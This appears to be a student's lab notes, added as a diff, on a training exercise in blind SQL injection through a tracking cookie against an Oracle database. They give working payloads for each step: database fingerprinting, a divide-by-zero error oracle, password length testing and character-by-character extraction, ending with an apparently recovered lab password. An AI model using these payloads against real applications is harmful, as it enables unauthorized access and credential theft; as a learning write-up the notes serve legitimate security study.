@@ -1,0 +1,46 @@
+Lab 12- Blind SQL Injections attack with conditional errors
+
+vulnerable parameter - tracking Cookie
+
+End Goals:
+- Output the administrator's password hash by exploiting a blind SQL injection vulnerability using conditional errors.
+- Login as the administrator using the extracted password hash.
+
+Analysis:
+1. Prove that the parameter is vulnerable to SQL injection.
+Try with  ' Result Error 500 Internal Server Error
+Try with  '||(select '')||' - Error because it is not Mysql
+Try with '||(select '' from dual)||' Successfull it is from Oracle
+COnfirm : '||(select '' from dualasdadasdas)||' -Should Give error
+
+2. Confirm that users table exists
+' || (select '' from users where rownum=1) ||'
+Successfull it is from Oracle and users table exists
+
+3. Confirm that administrator user exists
+' || (select '' from users where username='administrator' and rownum=1) ||'
+Success users exists
+But it does not ensure that 
+
+' ||(select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+-- Brief: If the CASE condition is true the DB evaluates TO_CHAR(1/0) which causes a division-by-zero
+-- error (ORA-01476). The application will return an error when true and no error when false,
+-- allowing blind extraction by observing error vs success.
+
+From this we can ascertain whether the administrator exists
+
+
+' ||(select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' )||'
+First part that runs users where username='administrator' If true then this part (select CASE WHEN(1=1)) it is true so it will give false return TO_CHAR(1/0) hence error 500
+
+But if we want to Confirm
+' ||(select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='adsdasd' )||' Any username Should return 200 as it is false
+
+4. Determine length of password
+' ||(select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1)||'
+
+5. Output the administrator password
+' ||(select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1) ='a')||'
+
+o6pg45qqx69tlgd0uxnm
+use the Sniper for free and brute forcer
